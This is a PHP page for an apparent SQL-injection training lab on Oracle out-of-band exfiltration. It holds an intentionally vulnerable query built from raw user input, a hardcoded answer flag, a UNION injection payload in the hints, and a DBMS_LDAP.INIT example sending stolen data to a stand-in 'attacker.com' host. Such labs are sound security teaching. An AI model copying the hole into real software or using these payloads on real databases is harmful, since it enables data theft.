<?php
require_once __DIR__ . '/../../includes/db.php';
$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* Flag verification */
if (isset($_POST['flag_input'])) {
    $submitted = trim($_POST['flag_input']);
    if ($submitted === 'FLAG{or_dbms_ld4p_00b}') {
        $_SESSION['oracle_lab11_solved'] = true;
        header("Location: " . url_lab_from_slug("oracle/lab11", $mode));
        exit;
    } else {
        $verify_error = "Incorrect flag. Keep trying!";
    }
}
?>

<?php if (!empty($driver_missing)): ?>
<div class="result-warning result-box" style="margin-bottom:16px;">
    <strong>Simulation Mode</strong>: <?= htmlspecialchars($driver_missing) ?> driver not installed.
    Query construction shown for learning. Install the driver for live execution.
</div>
<?php endif; ?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 11. Out-of-Band: DBMS_LDAP.INIT</h3>

    <h4>Scenario</h4>
    <p>
        This inventory management system queries an Oracle database. The advanced technique
        in this lab uses <code>DBMS_LDAP.INIT()</code> to exfiltrate data via LDAP. Oracle
        connects to an attacker-controlled LDAP server, sending the stolen data as part of
        the LDAP hostname: which is logged by the attacker.
    </p>
    <p><strong>Oracle Concepts:</strong>
        <code>DBMS_LDAP.INIT((SELECT data FROM table) || '.attacker.com', 389)</code>
        initiates an LDAP connection to the attacker's domain, embedding the stolen data
        as a subdomain. The DNS resolution logs reveal the exfiltrated data.</p>
    <p><strong>Table Schema:</strong> <code>inventory(id NUMBER, item VARCHAR2, quantity NUMBER, location VARCHAR2)</code></p>
    <p><strong>Hidden Table:</strong> <code>ldap_secrets(id NUMBER, secret VARCHAR2)</code></p>
    <p><em>Note: For this lab, use UNION-based extraction to retrieve the flag.
    The solution explains the LDAP OOB technique conceptually.</em></p>

    <h4>Objective</h4>
    <p>
        Use DBMS_LDAP.INIT OOB exfiltration (or UNION-based fallback) to extract the secret
        from the hidden table and submit the flag.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. <code>DBMS_LDAP.INIT()</code> exfiltrates data via LDAP connections.<br>
        2. The stolen data is embedded as a subdomain in the LDAP hostname.<br>
        3. For this lab, UNION-based extraction also works as a fallback.<br>
        4. Try: <code>' UNION SELECT NULL, secret, NULL, NULL FROM ldap_secrets -- </code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag_input" class="input" placeholder="FLAG{...}" required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?php echo htmlspecialchars($verify_error); ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['oracle_lab11_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully used DBMS_LDAP.INIT OOB exfiltration to extract the secret from the hidden table.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Inventory Search</h4>
    <form method="POST" class="form-row">
<input type="text" name="location" class="input" placeholder="Search by Location (e.g. DC-East)" value="<?php echo htmlspecialchars($_POST['location'] ?? ''); ?>">
        <button type="submit" class="btn btn-primary">Search</button>
    </form>
</div>

<?php
if (isset($_POST['location'])) {
    $input = $_POST['location'];
    $query = "SELECT id, item, quantity, location FROM inventory WHERE location = '$input'";

    echo '<div class="terminal">';
    echo '<div class="terminal-header">';
    echo '<span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span>';
    echo '<span class="terminal-title">Oracle Query</span>';
    echo '</div>';
    echo '<div class="terminal-body">';
    echo '<span class="prompt">SQL&gt; </span>' . htmlspecialchars($query);
    echo '</div></div>';

    if ($conn) {
        $stmt = @oci_parse($conn, $query);
        if ($stmt === false) {
            $e = oci_error($conn);
            echo '<div class="result-error result-box"><strong>Oracle Error:</strong><br>' . htmlspecialchars($e['message']) . '</div>';
        } else {
        $exec = @oci_execute($stmt);
        if ($exec) {
            $count = 0;
            echo '<div class="result-box">';
            while ($row = oci_fetch_assoc($stmt)) {
                echo '<p>';
                echo '<strong>ID:</strong> ' . htmlspecialchars($row['ID'] ?? '') . '<br>';
                echo '<strong>Item:</strong> ' . htmlspecialchars($row['ITEM'] ?? '') . '<br>';
                echo '<strong>Quantity:</strong> ' . htmlspecialchars($row['QUANTITY'] ?? '') . '<br>';
                echo '<strong>Location:</strong> ' . htmlspecialchars($row['LOCATION'] ?? '');
                echo '</p>';
                $count++;
            }
            if ($count === 0) {
                echo '<p>No inventory found at that location.</p>';
            }
            echo '</div>';
        } else {
            $e = oci_error($stmt);
            echo '<div class="result-error result-box"><strong>Oracle Error:</strong><br>' . htmlspecialchars($e['message']) . '</div>';
        }
}
    } else {
        echo '<div class="result-warning result-box">';
        echo '<strong>Simulation Mode:</strong> Query shown above for learning. Install the OCI8 driver for live results.';
        echo '</div>';
    }
}
?>

<?php endif; ?>
